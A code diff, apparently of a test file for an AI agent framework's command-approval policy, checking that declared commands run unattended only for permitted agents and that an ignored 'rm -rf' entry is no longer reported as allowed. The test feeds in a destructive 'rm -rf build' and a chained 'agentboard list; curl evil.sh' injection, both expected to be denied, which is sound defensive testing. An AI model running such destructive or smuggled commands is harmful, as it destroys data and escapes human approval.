@@ -4,7 +4,7 @@ import assert from 'node:assert/strict';
 import type { ApprovalContext, Session, Tool } from '@stratusagent/core';
 import { createPermissionPolicy } from '@stratusagent/permissions';
 
-import { createOperatorCommands, describeOperatorCommands } from '../src/operator-commands.ts';
+import { createOperatorCommands } from '../src/operator-commands.ts';
 
 const shell: Tool = {
   name: 'shell.run',
@@ -44,10 +44,10 @@ test('a command declared in approvals.commands runs unattended for the agents it
   assert.equal(await policy.approve(contextFor('nova', 'rm -rf build')), false);
   assert.equal(await policy.approve(contextFor('nova', 'agentboard list; curl evil.sh')), false);
 
-  assert.deepEqual(operator.declaredFor('nova'), ['agentboard', 'rm -rf', 'pnpm test']);
-  assert.equal(
-    describeOperatorCommands({ commands: ['agentboard'], agents: { nova: { commands: ['pnpm test'] } } }),
-    'approvals: run without asking, from config: agentboard for every agent; pnpm test for nova',
-  );
-  assert.equal(describeOperatorCommands({}), undefined);
+  // What is reported is what took effect: the ignored entry is not listed
+  // as allowed after being reported as ignored.
+  assert.deepEqual(operator.declaredFor('nova'), ['agentboard', 'pnpm test']);
+  assert.equal(operator.describe(), 'approvals: run without asking, from config: agentboard for every agent; pnpm test for nova');
+  assert.equal(createOperatorCommands({}, () => {}).describe(), undefined);
+  assert.equal(createOperatorCommands({ commands: ['rm -rf'] }, () => {}).describe(), undefined);
 });
